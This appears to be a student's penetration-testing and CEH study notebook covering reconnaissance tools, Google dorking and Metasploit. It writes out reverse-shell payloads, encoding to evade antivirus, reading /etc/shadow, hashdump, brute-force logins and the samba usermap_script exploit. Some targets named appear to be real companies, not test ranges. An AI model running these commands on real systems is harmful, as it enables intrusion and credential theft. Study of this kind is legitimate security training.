- Websites to Practice Pentesting ->
  - AltoroMutual(online Banking Website, https://demo.testfire.net)
  - certifiedhacker.com
  -	hackthissite.org
  - hrithikrules.com
  - hsploit.com // for information gathering website form hackersploit
  - eplanetsoft.com // use only for Information Gathering
  - spacex.com // use only for maltego
  - google-gruyere.appspot.com
  - scanme.nmap.org 	// this website is used for testing nmap cmds
  - https://digi.ninja/projects/zonetransferme.php  // this site is for testing also
  
Step - Check the Webiste urself by exploring it (look for contact info and career info in website)
      - Try to look for the career tab in a website so this way u get to know what technology stacks the target organizations r
        using.

Step - Check whois info for target (Passive)
  - "whois.sc" or "whois.domaintools.com" this website contains the info about the domain registrations, the registration date info, 
  hackers some time buy the domains at the time of the expiration and then resale it to the company again at very high prices bcz they
  need that domain for their buissness.
  Whois Lookup -> It is a protocol which is used to find owners of the internet resources(such as servers, IP and domain)
  Ex go to ->
  Note - if u do ping w3schools.com // u can get the IP of the application
  
  - U can also go to website dnsstuff.com, it allows u to enumerate and gather info regarding DNS reconnaisance go to free tools
  section and then to DNSreport section and enter the target
  
  - cmd -> whois hsploit.com // to see whois lookup info

Step -  How to know about the technologies used by the target website and other info?
        go to toolbar.netcraft.com/site_report (Passive)
        
        - 'netcraft' website is used to know about the technology used by the website and also it's subsites, u can get the
          information about the organization of that website and its hosting info.

Metasploit framework ->

exploit/module/auxillary -> use to exploit the vulnerability
payload -> we can use reverse shell or meterpreter to give access to target
	- singles r for single action
	- stagers r used for creating a communication between target and attacker
	- stages r large payloads which give attacker a good control over the target such as to have meterpreter instances and vnc etc
auxillary -> it will give things like dos analysers, crawlers,spoofers, scanners etc. it kind of gives robust tools which r primaryly
	used to scan the target system for vulnerabilities or DOS attacks
encoders -> it is used to re-encode payloads and exploits to bypass security systems kind of evading method based upon the target
	system such as php, x64, x86 etc
nops -> it causes the system or CPU to do nothing for entire clock cycle or we can say they allow run a specific file or code after
	u have exploited the buffer overflow, they allow u to run remote execute code on the target machine, it comes handy for tightly
	secured systems
post -> it for post exploitations after the system has been exploited


cd /usr/share/metasploit-framework/modules // all msf modules lies here
if u do cd exploits // u will see the categories of the exploits and further 'cd' will show more categories 


Step - 
    cmd -> service postgresql start // required to start the service before msfconsole
    cmd -> msfconsole
      > search vsftpd  // here vsftpd is a version of FTP and we r here searching for it's exploit available in msfconsole then use
      the path mentioned in exploit with 'use'
      > search platform:linux // to search for particular OS
      > search type:tcp  // to search for exploit with word tcp in it
      > search type:exploit platform:windows keyword_to_search(Ex->flash)
      > search excel // For Microsoft excel vulnerabilities
      > help // to get list of cmds
      > help search // for more search options
      > help show
      > help generate // generate a payload for certain laungages such as java, python and many more
      > help workspace
      > db_status // to see running DB
      > db_connect -y /usr/share/metasploit-framework/config/database.yml
      > db_export , db_loot etc // look into then using like "db_export -h"
      > use gather/search_email_collector // to start working in search_email_collector auxillary(module)
      > use exploit/windows/browser/adobe_flash_avm2 //
      > show options // it will list the inputs needed to execute this module
      > show targets // for the particular exploits to know on what type they will work
      > show payloads // to list the payloads compatible with exploit which could be used 
      > show advanced
      > show info // to give u info about the exploit
      > show evasion // for IDS explore to evade
      > show encoders // for making payload less likely detected
      > set DOMAIN hackthissite.org // to input value in DOMAIN variable
      > set OUTFILE hackthissite_msf_sec // to input other value to write output
      > exploit   // to launch the auxillary
      o/p - list the emails associated with the target
      
      // stager tries to stage a connection between the kali or metasploit instance and the victim machine so it tries to make the
      connection as the part of the exploit, this u can see in below meterpreter scenerio as on connection it would be show as
      'stage' connection to target
      
      - Options ->
      - use payload/windows/shell/reverse_tcp
      - setg LHOST ip // setg is for particular setting to be a global setting so u do not need to enter certain entries again
      - unsetg LHOST ip // to unset the variable value
      
      - use payload/windows/shell_bind_tcp
      - generate // it generate the shell code for this windows/shell_bind_tcp
      - setg RHOST ip
      - generate // 2nd time generate will show changes in the shell code
      // try to change the hex code or signate of payload so that they could not be get detected by anti-virus such as \xff part of
      the generated shell code for payload is a problem as it is detectable
      - generate -b \x00\xff  // list the hex characters to remove to avoid by anti virus but their is a limit to the shell code
      could get removed from the payload
      - generate -e x86/shikata_ga_nai -i 3 -f bash // -e to use encoding on the payload, -i to use the iterations of encoding as
      more the iterations more difficult for the anti-virus to detect the payload, -f is for the language for the code or payload
      to work here we r doing bash
      - workspace // to check list of workspaces
      - workspace -a workspace_name // add workspace
      - services // lists the host and databases
      - hosts -h
      - hosts -c address,os_flavour // to show data regarding these columns 
      - creds  // to see credentials 
      
      // meterprter is a payload which once is on the target gives the shell for remote system, it exists on the memory of the
      target system so it gives lot of stealth option as well
      
      Scenario in which we know that the default password is selected for the target in postgresql DB
      - workspace
      - search postgres
      - use exploit/linux/postgres/postgres_payload
      - setg RHOSTS ip
      - set PASSWORD password // this is set by doing the reconnaissance or could be alreday mentioned in exploit
      - show advanced
      - show targets
      - exploit
      meterpreter > help // to see the options could be run in meterpreter session
      		  > background // this will put a session in the back ground then return to it
		  > sessions // to see active sessions
		  > sessions -h
		  > sessions -i session_id
		  > cat /etc/passwd // if u get into the system
		  > cat /etc/shadow
		  > shell // to get the shell on target
		  	> id 
			> exit
		  > in the meterpreter session u can run cmds such as ifconfig, netstat, arp ,route, upload and download
		  > background
		  > search post or search hasdump
		  > sessions -i 1
		  > run /post/linux/gather/hashdump  // this will only run if the account with session is root type or allowed
		  > ps // to know processes on target
		  > sysinfo
		  
 Scanners in msfconsole -> 
 		msfconsole > hosts // show the connected systems
			   > services // to show the service with which the meterpreter shell connection is established
			   > hosts -d ip // to remove host 
			   > nmap -h // for scan list cmds
			   > nmap -A ip
      			   > db_nmap -A ip // this will pull and populate the database with scan info
			   > hosts // now this find will be populated
			   > services
			   > creds
			   > search postgres
			   > use exploit/linux/postgres/postgres_payload
			   > exploit
			   > ifconfig
			   > exit
			   > back // to get out of auxillary
			   > creds // it should also be get populated now
			   > search portscan 
			   > use auxillary/scanner/portscan/tcp
			   > setg RHOSTS ip
			   > exploit
			   > search scanner
			   > search smb_version
			   > use auxillary/scanner/smb/smb_version
			   > show options
			   > exploit
			   > search services // choose one out of them such as mysql
			   > use auxillary/scanner/mysql/mysql_version
			   > exploit
			   > use auxillary/scanner/postgres/postgres_login
			   > creds 
			   > use auxillary/scanner/postgres/postgres_hashdump
			   > exploit
		
Discovering exploits msfconsole -> 
			   > search mssql
			   > services -p 21 // to know the service running on port 21 on target
			   
Login Attempt msfconsole -> use auxillary/scanner/smb/smb_login
			  > show options
			  > set SMBuser postgres	// try other credentials to such as msfadmin
			  > set SMBpass postgress
			  > exploit // this event could be stored in log events of IDS, IPS etc
			  
VNC scanner msfconsole -> search scanner/vnc
			> use auxillary/scanner/vnc/vnc_none_Auth 
			> exploit  // this will work if their is void password
		
wmap msfcosole -> search wmap
		> use auxillary/crawler/msfcrawler
			or
		> load wmap
		> wmap_sites -a target_url
		> wmap_sites -l // list things
		> wmap_targets -h
		> wmap_targets -t target_url
		> wmap_run -t // to start test
		> wmap_run -e // use wmap all modules together
		> vulns // to list vulnerabilities
		> wmap_vulns -l // to get better list
		
Nessus msfconsole -> on Kali terminal -> service nessusd status // to check nessus status is active or not
		// open the nessus on browser -> https://icpl13708:8834
		msf > banner
		    > load nessus
		    > nessus_help
		    > nessus_connect username:password@own_ip:port ssl_verify
		    
------------------------------------------------------------------

	> search ssh_version
	> use auxillary/scanner/ssh/ssh_version // auxillary scans r more accurate then nmap
	> set RHOSTS ip
	> set THREADS 100 // more the threads fast the process
	> run
	
	
------------------------------------------------------------------

ssh login brute force msfconsole -> https://www.youtube.com/watch?v=_C7nRJ6WsmI , time -> 39:00 around

apache tomcat login brute force msfconsole -> https://www.youtube.com/watch?v=_C7nRJ6WsmI , time -> 46:00 around

use rockyou.txt wordlist for brute forcing wifi, location for file -> usr/share/wordlists
 use metasploit wordlists for normal bruteforce such as mirai_user_pass.txt

------------------------------------------------------------------

	> search samba
	> use exploit/multi/samba/usermap_script
	> show payloads
	> set payload cmd/unix/reverse_netcat
	> exploit
			   
Step - Footprinting phase allows the attacker to gather the information regarding internal and external security architecture, he 
       has to face a target
       Pseudonymous Footprinting -> It includes footprinting through online sources, identity is hidden and misguided
       Internet Footprinting -> includes footprinting and reconnaissance methods for gaining information through internet such as
                                Google Hacking
       Gather information from finanacial services -> there r some Financial services powered by different search engines which
       provide financial info of international known organizations such as->
       - www.google.com/finance
       - finance.yahoo.com
       
       - "Google Hacking" means that how efficiently we can use google to do our hacking tasks such as for reconnaissance.
          - On google search use following syntaxs for better search ->
          - redmi note 5 -flipkart.com // this will not give the results from the flipkart.com
          - redmi note 5 -flipkart.com -mi.com // multiple website filtering for google search
          - redmi note 5 site:flipkart.com // this will give the result only from flipkart.com
          - Open google.com then go to settings and then Advance search and here u can set filters to do the search as u like
          - "Happy Message" this gives u the result for the both words combined otherwise the google would search and give the
            results by searching seperatly for Happy and seperatly for Message.
          - U can do the mathematical calculations in the google search
          - inurl:eccouncil // this will only show the results in whose url the eccouncil is present, now days most of the webcams
            are web based means online hence if we search the specific url for the webcam then we can access it same goes for
            printer and other perifheral devices.
            Ex: intitle: webcam 7 inurl: 8080 ,in google search and u will get the webcam results accordingly 
          - intitle:"Index Of" intext:.ftpconfig site:target_site // to find a file on the target website, this way we can also 
            check if our own website has such vulnerability or not
          - inurl: .php?id=   // to search for websites with specific url 
       
       Advance google search operators -> Screenshot(431)
       Question -> When you are collecting information to perform a data analysis, Google commands are very useful to find sensitive
       information and files. These files may contain information about passwords, system functions, or documentation. What command
       will help you to search files using Google as a search engine?
       Answer -> site:target.com filetype:xls username password email

Step - exploit-db.com // to know about vulnerabilites of certain databases and it also gives u the results on the basis of 
     ports, platforms, author etc.
    - On exploit-db.com in the left panel, go to "GHDB" for better reconnaissance using google search techniques.
    - We can also search for the vulnerable routers and get its access such as accessing router and gets the router location, 
      access webcams
      
Step - Metagoofil Metadata Tool ->
    - This tool can be used to do reconnaissance on victim website, it also uses the google database from the exploit-db.com
    - It gather and extract metadata of public docs, download the files from victim and at end it will generate a report
    - This tool works on kali linux machine
    - cmd -> apt-get install metagoofil
    - cmd -> metagoofil
    - cmd -> metagoofil -d hackthissite.org -t doc,pdf -l 200 -n 5 -o hackthissite_metagoofil -f
    
Step - It's good to collect information of the people in the organization, for this we can use "pipl.com" website and just provide
      the name or email or any other data and it will search for u about people, other websites like this is 'zabasearch.com' but
      it is only related to US, it can also provide info such as background check and property check, use other sites also like
      'linkedin' to know the professional information about people. 
     - Try to create pipl.com account -??
     
Step - Maltego tool -> 
    - From a Web Domain to find in Maltego
      - Domain
      - Website(NS, MX, Tracking Codes)
      - IP Address
      - Netblock
      - AS Number
      
      Steps to Proceed in Maltego ->
      - Take a 'Domain' target from the left panel to drag and drop
      - Right click on domain icon of target and then select the Transform 'To Website[Quick Lookup]' // O/P this will load the
        website inside the Maltego
      - Right Click on Loaded website icon and then selct the Transform 'To Tracking Codes' // this gives info of other websites 
      which r using the same tracking code at the same organization owns, and on running the transform we will get the tracking 
      code back
      - Right Click on Tracking code and select transform 'To other sites with the same code' // this will list the websites that
      r using the same tracking code
      - Rigth click on Domain and run transform 'To DNS Name - MX(mail server)' // O/P it list the servers used by target for mail
      server
      - Right Click on Domain and run Transform 'To DNS Name - NS(name server)' // o/p it list the name servers for the target
      - Right Click on Domain and run transform 'To Domains [DNS]' // o/p This will give as any other domain that r on the same DNS
      - Right Click on Domain and run Transform 'To DNS Name - interesting[Robtex]'
      - Right Click on Domain and run Transform 'To DNS Name - [Find Common DNS Names]' // o/p it list futher DNS info
      - Right Click on Domain and run Transform 'To DNS Name - interesting[Robtex]'
      - Right Click on 'Loaded Website' and run Transform 'To DNS Name - [Enumerate hostname numerically]' with default settings
      - Right Click on 'Loaded Website' and run Transform 'To IP Address - [DNS]'
      - Right Click on 'IP Address' and run Transform 'To DNS Name - [Ohter DNS names]' // to find more servers on the same IP address
      - On Graph press 'Ctrl + A' and this will list all the stuff on forms of the entity on 'Right Panel' select all from the 
      Right panel and run the transform 'To IP Address DNS'
      Note -> Netblocks r huge range of IP addresses
      - On the Right Panel just select all IP addresses and run the transform on them 'To Netblock [Using routing info]'
      - On the Right Panel just select all Netblocks and run the transform 'To AS number' // AS no is a top level service no. that
      is provided by the telecommunications companies in such to provide a large set of switches
      - On the Right Panel just select all AS no.'s and run the transform 'To Netblocks in the AS[Robtex]' // to known is company
      is using their known AS no.'s or someone elses
      - On the Right Panel just select all Netblocks and run the transform 'To DNS Names in Netblock[Reverse DNS]'// to find out any
      websites associated with our target by jumping up a chain a bit, we know get to understand the sub services they use
      - Now on the servers appeared on the above step select on server and try to run transform 'To Web Site[Quesry ports]'
      - Change the Views to understand relationships among entities
--------------------------
      - Take a 'Domain' target from the left panel to drag and drop
      - Right click on domain icon of target and then select the Transform 'To Email addresses[PGP]'
      - Right click on domain icon of target and then select the Transform 'To Email addresses[using Search Engine]'
      - Right click on domain icon of target and then select the Transform 'To Email @domain[using Search Engine]'
      - In terminal cmd -> theharvester -d spacex.com -l 1500 -b pgp
      // this is incomplete  
----------------------------------
    
     - Right Click on Domain and run Transform 'To DNS Name - interesting[Robtex]'
     - Right click on domain icon of target and then select the Transform 'To Email addresses[using Search Engine]' // to know the
     associated emails for this target
     - Right click on domain icon of target and then select the Transform 'To Email @domain[using Search Engine]'
  
--------------------------------------------
      - Right click on domain icon of target and then select the Transform 'To Files(interesting)[using Search Engine]'
      Note - If arrow is going from the IP to the website shows that these websites are on this IP, and the arrow which is going
      form the website to the IP r hosting companies.
      
Step - "way back machine" or archive.org is a website which helps in collecting info or history of any website by going through
        snapshots of it. // by using this u can gather the info which has been removed form the website now but it was present 
        their on the earlier times of the website
        - "Any who" is a website from were u can get the information about the person, also use the job websites for getting more
        information.

Step - Different tools give different results, so it's recommended to use mulitple tools for foot printing not just one.
     - "internet archive" this website will show u the archives of a target even if that target website is removed or changed the
        website, it will also show u that how the website look like at that previous time and dates # CEH Exam imp
     - If something new comes on a website and u wants instant update on it u can do this by using "alert" of google and 
        specifying the website their -> www.google.com/alerts, this will notify using email.

Step - How to get comprehensive DNS information on target website?
        go to "robtex.com" we can look into the 'a' records of RECORDS Section (which r used for combining the website name with 
        IP), 'ns' the name server records, 'mx' the mail server records DNSBL section shows the blocked as they r considered spam.
        - In the Reverse Section we can look for the websites hosted on the same server.
        
Step -    Discovering Websites on the same server ->
          We can hack into the other website which is installed on the same server and then attack the target website

        - Attackers can also use the mail server and name server as by pretending them and do social engineering attacks

          Websites hosted by the same webserver would have the same IP's such as phs63.org and zaid.com website ->
          https://www.yougetsignal.com/tools/web-sites-on-web-server/ or we can also go on bing.com and enter IP their as
          ip:ip_address_here and all the websites shown their r the websites which r on the same web server
          
          Or use website for same task -> https://viewdns.info/reverseip/
          
Step -    Sub Domains -> Such as beta.facebook.com, the sub domains r for certain users or customers, the search engines never have sub
          domains and u will also not see the link leading to them, so we can use the sub domains also to exploit the websites
          To know about the sub domains we use the tool called 'knock' // it use the brute force attack
          cmd -> git clone https://github.com/guelfoweb/knock.git
          cmd -> cd knock/knockpy
          cmd -> python knockpy.py website_name

Step -    Find the Files and directories stored on the target computer or website ->
          To check if we go to our metasplot machine and do cmd -> cd /var/www then cmd -> ls -la
          we can see the directory for the web application mutillidae
          So to open it from our attacker machine we can use-> ip_of_web_server/mutillidae

         we can use dirb as cmd -> man dirb  // this cmd also uses brute force
         cmd -> dirb http://ip_address/path  // it use a wordlist file So we can use the cmd as like this also
         dirb http://ip_address/path wordlist_file_path

         By using the above cmds we would get the list of all the files and directories such as phpinfo.php, config.inc and 
         robots.txt // we can use the robots.txt to find about the files which website wants to hide and we can use phpinfo.php to
         find the data about the php machine and details.

Step -   Detection of Web Application Firewall with WAFW00F ->
        - in the most cases their is web application firewall available, So here firewall stops the malicious requests
        - in the attacker machine terminal -> wafw00f
        -> wafw00f https://66.29.212.110 // and it will simply tell u whether their is firewall or not

Step -   dnsenum tool // go to location -> /usr/share/dnsenum and open file dns.txt(this file contains the list for testing) 
cmd-> dnsenum --dnserver 8.8.8.8 --enum --noreverse -f /usr/share/dnsenum/dns.txt --subfile /root/Results/dnsenum_1.txt hackthissite.org
	      // --dnserver flag is to set DNS here we r using Google DNS, --noreverse is to skip the reverse lookup operations
        // O/P is -> 'Host's addresses' means the list of IPs running target website
                     'Name Servers' lists for target website
                     'Mail Servers' lists for target website
                     'Sub domains' lists for target website etc.

        Lists of dnsserver could be used ->
        - 8.8.8.8 // Google
        - nsztm1.digi.ninja // for zone tranfer vulnerability by dnsenum

Step -  dig tool // dig tool gives the DNS zonetransfer info more reliable
        cmd -> dig axfr @nsztm1.digi.ninja zonetransfer.me
        ping.eu/traceroute/ <- website for traceroute info

Step -  dnstracer tool //
        cmd -> dnstracer -v -o gmail.com
        cmd -> dnstracer -q soa -o gmail.com

Step -  Dimitry tool ->  // not used now days
        - Port scan is considered by some websites as illegal activity
        - cmd -> dmitry -wnse target_website.com 
        // -w for whois info, -n for netcraft info, s for sub domains info, e for email info
        - cmd -> dmitry -pb target_ip 	// p for port scanning, b for banner grabing

Step -  theHarvester tool -> (Passive)
        cmd -> theHarvester -d infostretch.com -b google -c // use -c is for brute forcing and use -v if u wants to find out virtual
        hosts to find out other websites served on the same server
        // use harvester to generate reports



Target -> find which r the extra sites hosted on the server hackthissite.org and demo.te...
- email harvest not working for eccouncil.org, w3schools etc ?
- why on 'hrithikrules.com' in maltego the 'To Track Codes' transform doesn't work
